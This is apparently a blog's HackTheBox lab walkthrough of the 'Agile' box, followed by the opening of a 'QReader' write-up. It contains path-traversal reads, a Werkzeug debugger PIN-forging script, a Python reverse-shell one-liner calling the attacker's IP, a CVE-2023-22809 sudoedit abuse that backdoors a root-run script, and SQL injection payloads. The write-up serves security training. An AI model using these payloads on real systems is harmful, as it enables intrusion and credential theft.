error.\nSince we didn\u0026rsquo;t click the save icon when generating out password, it seems like our database is still empty.\nOnce we add a password, we can see the call redirects to a custom url, download?fn=asdf_export_49adcafaf8.csv. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:\nArbitrary file read in /download In a simpler approach, we can check if we are able to reference any file by specifying the path: http://superpass.htb/download?fn=../../../../../../../etc/passwd\nUpon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:\nIn this file we can see 4 user accounts:\n1 2 3 4 corum:x:1000:1000:corum:/home/corum:/bin/bash runner:x:1001:1001::/app/app-testing/:/bin/sh edwards:x:1002:1002::/home/edwards:/bin/bash dev_admin:x:1003:1003::/home/dev_admin:/bin/bash Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from /tmp/ and the flask SECRET is also displayed:\nNote, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or curl:\n1 2 3 4 5 6 \u0026lt;script\u0026gt; var CONSOLE_MODE = false, EVALEX = true, EVALEX_TRUSTED = false, SECRET = \u0026#34;tDxE1kBphctDjlZ1DvYf\u0026#34;; \u0026lt;/script\u0026gt; The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this download vulnerability.\nFrom here, we can enumerate all or most of the python source files by watching the imports. For example, from superpass.services.utility_service import get_random tells us that there is a python file accessible at /app/app/superpass/services/utility_service.py. We can also determine that the main app.py file will be located at /app/app/superpass/app.py, based on where the import path is starting.\nUnsuccessful Foothold Attempts Recreating export.csv My first thought is to see how the export is behaving. Since we have a list of usernames on the machine, perhaps we can recall an export.csv that they have previously generated? I find my answer in /app/app/superpass/views/services/password_service.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def generate_csv(user): rand = get_random(10) fn = f\u0026#39;{user.username}_export_{rand}.csv\u0026#39; path = f\u0026#39;/tmp/{fn}\u0026#39; header = [\u0026#39;Site\u0026#39;, \u0026#39;Username\u0026#39;, \u0026#39;Password\u0026#39;] session = db_session.create_session() passwords = session.query(Password) \\ .filter(Password.user_id == user.id) \\ .all() session.close() with open(path, \u0026#39;w\u0026#39;) as f: writer = csv.writer(f) writer.writerow(header) writer.writerows((p.get_dict().values() for p in passwords)) It looks like the numbers appended are from get_random, defined in /app/app/superpass/services/utility_service.py:\n1 2 3 4 5 import datetime import hashlib def get_random(chars=20): return hashlib.md5(str(datetime.datetime.now()).encode() + b\u0026#34;SeCReT?!\u0026#34;).hexdigest()[:chars] It includes a time variable which we have no way of knowing. Essentially, it is technically possible to try to brute force potential exports by guessing every possible combination of 10 characters. But this can be considered a last resort, as it is not guaranteed that machine usernames will match the service\u0026rsquo;s account names, nor guarantee that the user had generated a csv file at all.\nForging a flask cookie My next thought is with the source code available and the flask secret (given through the error), we might try to forge a cookie for a different user.\nStarting with our cookie, we can grab it from Burpsuite\u0026rsquo;s request after session=\n1 .eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c Visiting a Flask cookie decoder online tool, we can decode without issue into something more readable:\n1 2 3 4 5 { \u0026#34;_fresh\u0026#34;: true, \u0026#34;_id\u0026#34;: \u0026#34;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96\u0026#34;, \u0026#34;_user_id\u0026#34;: \u0026#34;9\u0026#34; } While the _id appears to be a unique string likely tied to our current login session, we can see that we are user_id 9. Assuming the count starts at 0 and the admin has the first account, I edit this segment of the cookie and then I must re-sign using Flask\u0026rsquo;s secret key. To do so, I utilize the popular tool Flask-Unsign.\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Agile] └─$ cat tosign.txt {\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: \u0026#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96\u0026#39;, \u0026#39;_user_id\u0026#39;: \u0026#39;0\u0026#39;} ┌──(kali㉿kali)-[~/Documents/Agile] └─$ flask-unsign -s -S \u0026#39;tDxE1kBphctDjlZ1DvYf\u0026#39; --cookie tosign.txt InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk Unfortunately, trying to use this cookie resulted in a failure. Presumably, the _id hash no longer correlates to _user_id value and the cookie session becomes invalid.\nIDOR access on other user\u0026rsquo;s passwords When following the request trail involved in editing a password or leaving editor mode, we can see the url activities visiting /vault/row/\u0026lt;id\u0026gt; or /vault/edit_row/\u0026lt;id\u0026gt;. Additionally, when reviewing the source code, we see a similar check being performed, with seemingly no verification on the user. We can write a quick script to check a number range, or do the same in Burpsuite Intruder option:\n1 2 3 4 5 6 #!/bin/bash for i in {0..15} do curl http://superpass.htb/vault/get/$i --cookie \u0026#34;session=.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmY x6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c\u0026#34; done This approach was successful on box release, but has since been patched. Apparently it was never an intended approach.\nFoothold Recreating Werkzeug\u0026rsquo;s Debugger PIN Eventually I turn myself to the system\u0026rsquo;s active debugger mode. We noticed that this is turned on, since when we requested to download a file that didn\u0026rsquo;t exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:\nHowever, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.\nThere is a hacktricks article covering how we generate a matching PIN number based on some of the system\u0026rsquo;s information.\nWe must gather system information utilized to generate the PIN, then we can recreate it locally using the script presented in the article. Each component was a small adventure to get. The final script contained the following information:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;www-data\u0026#39;,# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;wsgi_app\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/app/venv/lib/python3.10/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;345052401235\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;ed5b159560f54721827644bc9b220d00superpass.service\u0026#39;# get_machine_id(), /etc/machine-id ] Username as www-data is common for linux web services, although python can also be run by users as well. I had been trying combinations with both www-data as well as runner, as this account seemed like it might have been generated for the sole purpose of running a web server. Modname as flask.app is the default option provided by Hacktricks, but also we can see this in app.py, where it simply states import flask. wsgi_app was the hardest to find, as this variable is not well defined in the article, simply presented as Flask. Under def enable_debug(): from app.py, we see the debug application referred to as app.wsgi_app = DebuggedApplication(app.wsgi_app, True). /app/venv/lib/python3.10/site-packages/flask/app.py is given on the error page. Private Bits: When accessing /sys/class/net/eth0/address, we get id 00:50:56:b9:ce:53: To convert into the private bit variable, we utilize python to print:\n1 2 \u0026gt;\u0026gt;\u0026gt; print(0x005056b9ce53) 345052401235 Machine ID is a combination of /etc/machine-id and the last section of /proc/self/cgroup. Visiting /etc/machine-id: Visiting /proc/self/cgroup:\nThe combined bit is ed5b159560f54721827644bc9b220d00superpass.service\nRemote Code Execution as www-data Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:\nimport socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.133\u0026quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/sh\u0026quot;)\nOn our listener:\n1 2 3 4 5 6 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.133] from (UNKNOWN) [10.10.11.203] 55440 $ whoami whoami www-data We have a shell, but it is still a \u0026ldquo;dumb\u0026rdquo; shell. Features such as autocomplete or interactive binaries such as vim will not work well, so we need to stabilize the shell. There are many ways to do this, my favorite being the use of script:\n1 2 3 $ script -qc /bin/bash /dev/null script -qc /bin/bash /dev/null (venv) www-data@agile:/app/app$ From here we background the session with ctrl+Z, and type stty raw -echo; fg. The fg will put us back into the rev shell session, where we press enter a 2nd time and our shell has been stabilized.\n1 2 3 4 5 6 7 8 (venv) www-data@agile:/app/app$ ^Z zsh: suspended nc -nvlp 8888 ┌──(kali㉿kali)-[~/Documents/Agile] └─$ stty raw -echo; fg [1] + continued nc -nvlp 8888 (venv) www-data@agile:/app/app$ Lateral Movement Accessing the SQL database After brief enumeration, I find an interesting json file in the base /app folder containing the SQL credentials:\n1 2 (venv) www-data@agile:/app$ cat config_prod.json {\u0026#34;SQL_URI\u0026#34;: \u0026#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass\u0026#34;} We see credentials as superpassuser:dSA6l7q*yIVs$39Ml6ywvgK. Since our shell has been stabilized, we can call an interactive mysql session. This would have failed if we had tried earlier.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 (venv) www-data@agile:/app$ mysql -u superpassuser -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 392 Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu) Copyright (c) 2000, 2023, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; Navigating the SQL is rather easy since there isn\u0026rsquo;t much information. The only unique database is superpass, and only 2 tables exist:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 mysql\u0026gt; show tables; +---------------------+ | Tables_in_superpass | +---------------------+ | passwords | | users | +---------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; select * from passwords; +----+---------------------+---------------------+----------------+----------+----------------------+---------+ | id | created_date | last_updated_data | url | username | password | user_id | +----+---------------------+---------------------+----------------+----------+----------------------+---------+ | 3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf | 762b430d32eea2f12970 | 1 | | 4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com | 0xdf | 5b133f7a6a1c180646cb | 1 | | 6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog | corum | 47ed1e73c955de230a1d | 2 | | 7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster | corum | 9799588839ed0f98c211 | 2 | | 8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile | corum | 5db7caa1d13cc37c9fc2 | 2 | | 10 | 2023-08-03 15:36:53 | 2023-08-03 15:36:53 | | | 7bbe46f078cc431df0c8 | 11 | +----+---------------------+---------------------+----------------+----------+----------------------+---------+ 6 rows in set (0.00 sec) Recall that on this machine, we saw a user named corum? Perhaps the \u0026lsquo;agile\u0026rsquo; url password is referring to this machine. When checking with su, we see a success.\n1 2 3 (venv) www-data@agile:/app$ su corum Password: corum@agile:/app$ As great as the stabilized reverse shell is, I happily move to an ssh connection from this point, as port 22 was confirmed open.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ssh corum@superpass.htb corum@superpass.htb\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Aug 3 15:45:18 2023 from 10.10.14.133 corum@agile:~$ ls user.txt We have finally reached the user.txt.\nHijacking a google chrome session through remote-debugging port Manual enumeration did not yield anything interesting to me. However, executing linpeas showed me a potential route to privilege escalation i was unaware of.\nThere is a process of google chrome running, and special attention is drawn to the fact that the --remote-debugging-port flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what runner can access in this webpage. First, we need a way for our local browser to reach the box\u0026rsquo;s port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach\n1 $ ssh -L 1080:localhost:41829 corum@superpass.htb To enter the port forwarding page in Google Chrome, in the url segment we type chrome://inspect/#devices. Next, we must configure our ports to the right of \u0026ldquo;Discover network targets\u0026rdquo;\nSet the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box\u0026rsquo;s port 41829.\nNow we can see a remote target. Notice the address is at http://test.superpass.htb. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.\nSelecting inspect will open a new DevTools tab, where we can interact with the chrome session.\nSelecting the Vault, we see new passwords, this time for edwards. This was also a user account name on the machine.\nUsing the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.\n1 2 3 \u0026lt;td\u0026gt;agile\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;edwards\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;d07867c6267dcb5df0af\u0026lt;/td\u0026gt; edwards:d07867c6267dcb5df0af\n1 2 3 corum@agile:~$ su edwards Password: edwards@agile:/home/corum$ Privilege escalation through sudo vulnerability The su is successful, and we now have 1 more user\u0026rsquo;s account to work with. Checking this account\u0026rsquo;s privileges, we see we can perform a sudo as dev_admin:\n1 2 3 4 5 6 7 8 edwards@agile:/home/corum$ sudo -l Matching Defaults entries for edwards on agile: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User edwards may run the following commands on agile: (dev_admin : dev_admin) sudoedit /app/config_test.json (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt This /app/app-testing/tests/functional/creds.txt is very desirable based on the name, and is only accessible by dev_admin. Upon running:\n1 edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt We see in a nano editor some more credentials for edwards.\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\nThe credentials don\u0026rsquo;t work for any user on the system; perhaps they are utilized for the google chrome debugging session?\nSearching for problems with sudoedit, I quickly find a very recent CVE, CVE-2023-22809. This CVE was released in under two months from the time of writing. Affected versions are 1.8.0 through 1.9.12.p1, so first we must check this:\n1 2 3 4 5 6 edwards@agile:/home/corum$ sudo -V Sudo version 1.9.9 Sudoers policy plugin version 1.9.9 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.9 Sudoers audit plugin version 1.9.9 Version 1.9.9 will be before version 1.9.12, so this should be vulnerable! Execution seems very straightforward. If we include extra arguments in environment variables (SUDO_EDITOR, VISUAL, and EDITOR), sudoedit will allow us to edit files not meant to be edited. With this strategy, we can edit any file dev_admin can edit. Looking for interesting targets:\n1 2 3 4 5 6 7 8 9 10 11 12 13 edwards@agile:/home/corum$ find / -user dev_admin 2\u0026gt;/dev/null /home/dev_admin /app/app-testing/tests/functional/creds.txt /app/config_test.json /app/config_prod.json edwards@agile:/home/corum$ find / -group dev_admin 2\u0026gt;/dev/null /home/dev_admin /app/venv /app/venv/bin /app/venv/bin/activate /app/venv/bin/Activate.ps1 /app/venv/bin/activate.fish /app/venv/bin/activate.csh Using the sudoedit exploit, we should be able to alter any of these files. But how can we really benefit from adding a line or two in some of these files? If there is a regularly running program that takes input from one of these files, we can supply malicious commands for that user to execute. Ideally, if there is a cronjob running as root for regular intervals, we can have root execute some commands for us. We can check for things as they run using pspy. Sending pspy over to the box: On my local kali, finding where I put pspy:\n1 2 3 4 5 6 $ locate pspy /home/kali/Downloads/pspy64 ┌──(kali㉿kali)-[~/Downloads] └─$ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... On the Agile box, downloading and running pspy:\n1 2 3 4 5 6 7 8 9 10 11 12 13 edwards@agile:/dev/shm$ wget 10.10.14.133/pspy64 \u0026amp;\u0026amp; chmod +x pspy64 --2023-08-03 16:52:45-- http://10.10.14.133/pspy64 Connecting to 10.10.14.133:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3104768 (3.0M) [application/octet-stream] Saving to: ‘pspy64’ pspy64 100%[==============================================\u0026gt;] 2.96M 4.00MB/s in 0.7s 2023-08-03 16:52:46 (4.00 MB/s) - ‘pspy64’ saved [3104768/3104768] edwards@agile:/dev/shm$ ./pspy64 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d After waiting a brief period, we see the root user access one of the files we can control:\n1 2023/08/03 16:56:01 CMD: UID=0 PID=51843 | /bin/bash -c source /app/venv/bin/activate We can see activate being invoked. Using our sudoedit exploit, we can alter this file to communicate back to us through a reverse shell payload. Setting up our environment variable:\n1 edwards@agile:/dev/shm$ export EDITOR=\u0026#34;vim -- /app/venv/bin/activate\u0026#34; Now executing our sudoedit command:\n1 edwards@agile:/dev/shm$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt When we execute we are not editing creds.txt. Instead, we see /app/venv/bin/activate\nTo ensure our payload runs at the start of this script, I insert the command before the commented lines:\nNow after waiting a few seconds, the connection reaches my kali machine:\n1 2 3 4 5 6 7 8 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.133] from (UNKNOWN) [10.10.11.203] 60376 bash: cannot set terminal process group (52086): Inappropriate ioctl for device bash: no job control in this shell root@agile:~# id id uid=0(root) gid=0(root) groups=0(root) Reflection After the IDOR vulnerability had been patched, this box turned out to be quite difficult! It was my first completion on a medium box, and the technique for remotely viewing the chrome process felt very original. While the sudo exploit felt quite simple, I appreciated that it wasn\u0026rsquo;t completely free since only dev_admin\u0026rsquo;s files were accessible. After going through the pain in generating the debugging PIN and sneaking into the google chrome page, it is nice to have a straightforward route to root.\n","date":"2023-08-05T09:04:19-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-agile/Agile_hu5e06ffde2f95e1276a1510a6a2985d71_363689_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-agile/","title":"HackTheBox - Agile"},{"content":"Initial Enumeration Initial nmap scanning reveals a web page, and an unusual open port only visible through full port scan:\n1 2 3 4 5 6 7 8 9 10 # Nmap 7.93 scan initiated Sat Mar 25 21:05:47 2023 as: nmap -p- -oN portsweep 10.10.11.206 Nmap scan report for 10.10.11.206 Host is up (0.058s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 5789/tcp open unknown # Nmap done at Sat Mar 25 21:05:47 2023 -- 1 IP address (1 host up) scanned in 35.78 seconds The port is uncommon, so I decided to see what nmap script and version enumeration can tell me:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 # Nmap 7.93 scan initiated Sat Mar 25 21:07:29 2023 as: nmap -sCV -p 22,80,5789 -oN nmap_initial.txt 10.10.11.206 Nmap scan report for 10.10.11.206 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 5789/tcp open unknown | fingerprint-strings: | GenericLines, GetRequest: | HTTP/1.1 400 Bad Request | Date: Wed, 12 Jul 2023 19:34:47 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | HTTPOptions, RTSPRequest: | HTTP/1.1 400 Bad Request | Date: Wed, 12 Jul 2023 19:34:48 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | Help, SSLSessionReq: | HTTP/1.1 400 Bad Request | Date: Wed, 12 Jul 2023 19:35:03 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close |_ Failed to open a WebSocket connection: did not receive a valid HTTP request. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5789-TCP:V=7.93%I=7%D=7/12%Time=64AF3896%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x201 SF:2\\x20Jul\\x202023\\x2019:34:47\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x20webso SF:ckets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/plain\\r\\n SF:Connection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocket\\x20c SF:onnection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20request\\.\\ SF:n\u0026#34;)%r(GetRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed SF:,\\x2012\\x20Jul\\x202023\\x2019:34:47\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x2 SF:0websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/pla SF:in\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocke SF:t\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20requ SF:est\\.\\n\u0026#34;)%r(HTTPOptions,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate: SF:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:34:48\\x20GMT\\r\\nServer:\\x20Python/3 SF:\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20t SF:ext/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20W SF:ebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\ SF:x20request\\.\\n\u0026#34;)%r(RTSPRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:34:48\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(Help,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:35:03\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(SSLSessionReq,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:35:03\\x20GMT\\r\\nSer SF:ver:\\x20Python/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nCo SF:ntent-Type:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x SF:20open\\x20a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x SF:20valid\\x20HTTP\\x20request\\.\\n\u0026#34;); Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 25 21:07:29 2023 -- 1 IP address (1 host up) scanned in 92.72 seconds We can see from Server: Python/3.10 websockets/10.4, that this unusual port is an open web socket. We will come back to this later.\nExamining the webpage Trying to visit the box\u0026rsquo;s ip address as 10.10.11.206 redirects us to qreader.htb. To properly visit the webpage that should be visible on port 80, we must add the address to our /etc/hosts file:\n1 $ echo \u0026#34;10.10.11.206 qreader.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Now the website is viewable.\nWe see the website advertised as a QR code reader:\nWe can test it out within the browser, or they allow us to download an offline version further below. There are options for windows or linux versions. Being on linux, I will use this version for now and hope there is no significant difference between the two.\n1 2 $ file QReader_lin_v0.0.2.zip QReader_lin_v0.0.2.zip: Zip archive data, at least v1.0 to extract, compression method=store Analyzing the QR Code Reader The zip contains an ELF binary for the QR code reader and a test.png to try it out\nAfter translating test.png it returns the box creator\u0026rsquo;s username. Nice touch. Selecting the about tab, and trying to get info on either the version or updates will return this Connection error message. What could it be connecting to, perhaps our box\u0026rsquo;s WebSocket port? Since the box itself is created and tested with static IP addresses, it isn\u0026rsquo;t unreasonable to believe that when the box is moved to live environments with the hosting IP address constantly changing, that connection attempts like this one might fail.\nWith the app open, I monitored the packet traffic data using tcpdump:\n1 2 3 4 5 6 7 8 $ sudo tcpdump tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes \u0026lt;...SNIP...\u0026gt; 20:04:21.317409 IP 10.0.2.15.53274 \u0026gt; 108-166-149-2.client.mchsi.com.domain: 56266+ A? ws.qreader.htb. (32) 20:04:21.317495 IP 10.0.2.15.53274 \u0026gt; 108-166-149-2.client.mchsi.com.domain: 57288+ AAAA? ws.qreader.htb. (32) 20:04:21.338657 IP 108-166-149-2.client.mchsi.com.domain \u0026gt; 10.0.2.15.53274: 56266 NXDomain 0/1/0 (107) 20:04:21.338724 IP 108-166-149-2.client.mchsi.com.domain \u0026gt; 10.0.2.15.53274: 57288 NXDomain 0/1/0 (107) When I query for updates, I see traffic pointing at ws.qreader.htb\nI had hoped to see the data information being sent to the WebSocket, but for this case it was not necessary as the error responses were informative enough. I had heard the data can be retrieved through decompiling the binary file, but this is beyond my skill at the time.\nExamining the exposed WebSocket Interacting with web sockets can be tricky. There are a variety of ways to do it, but I chose to utilize a Simple WebSocket Client Plugin for FireFox. Loading the page, we can input our url as ws://10.10.11.206:5789\nFortunately for us, it looks as though an improper input provides us with a small list of options on how we might interact. Since the output was JSON format, it is likely that the input must be JSON as well. After exploring for a bit, I find another response when probing ws://10.10.11.206:5789/update\nIt was a bit of a lucky hit that any version not 0.0.2 will return a message like this, otherwise it could be more difficult finding the version naming conventions in use. Now returning to /version, I check what happens when I input the older version 0.0.1:\nThere doesn\u0026rsquo;t seem to be any extra information leaked through these queries. Upon closer inspection, however, we can eventually discover that these /version queries are SQL injectable.\nNote that despite supplying the invalid version, we still receive the confirmation of version 0.0.2. From here, we should be able to leak the database information.\nFoothold Manual enumeration with SQLi UNION injections Eventually I find that the database is sqlite through the query UNION SELECT sql from sqlite_master:\n1 2 3 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Note that this type of sql injection often depends on having the same number of columns as the usual output. Since typically this websocket is expected to provide 4 columns (id, version, release_date and downloads), I supplement my union injection with 3 columns of NULL.\nThis first output shows a table called versions, which is likely what we are already getting from non-injected queries. Dumping all tables might be slow this way, but we can do so by supplying LIMIT to our query:\nNote that in this query I use tbl_name, so that the output isn\u0026rsquo;t so long. Using sql provides us information on all column names from within the table, so it is useful to use once we find an interesting table. For a better word-wrapping experience, from this point on I put all outputs in code brackets\nAfter dumping all tables, we see a full picture that looks like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 